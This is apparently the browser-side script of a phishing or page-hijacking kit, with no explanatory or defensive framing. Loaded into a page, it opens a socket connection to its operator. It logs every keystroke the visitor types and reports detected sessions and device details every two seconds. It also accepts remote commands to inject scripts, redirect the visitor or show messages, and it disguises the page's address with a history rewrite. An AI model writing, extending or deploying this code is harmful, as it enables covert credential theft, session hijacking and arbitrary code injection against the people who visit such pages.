import '@babel/polyfill'
import * as Socket from 'socket.io-client'

import { wait } from './utils'
import {
    resolveLazyLoadedLinks, resolveFavIconEdgeCases, resolveEventfulForms, getScreenShot, checkFirstTimer,
    getGeneralInfo, getActiveSessions, injectScript, getNetworkSpeed, say, redirect
} from './helpers'


async function main () {
    const io = Socket()
    const firstTime = checkFirstTimer()
    const link = window.ORIGINAL
    let keyLog = ''
    const helpersToLoop = async (seconds = 2) => {
        resolveLazyLoadedLinks()
        io.emit('general info', await getGeneralInfo())
        io.emit('detected sessions', await getActiveSessions())
        await wait(seconds)
        await helpersToLoop()
    }

    resolveFavIconEdgeCases()
    resolveEventfulForms()
    io.emit('new guest')
    io.emit('network speed', await getNetworkSpeed())
    helpersToLoop()
    io.on('say', (text:string) => say(text))
    io.on('alert', (message:string) => alert(message))
    io.on('inject', (script:string) => injectScript(script))
    io.on('redirect', (url:string) => redirect(url))
    document.body.onkeydown = e => io.emit('key log', link, keyLog += e.key.length > 1 ? `<${e.key}>` : e.key)
    window.history.pushState('data', 'Title', encodeURIComponent(link))
}


document.readyState === 'complete'
    ? main()
    : window.addEventListener('load', main)
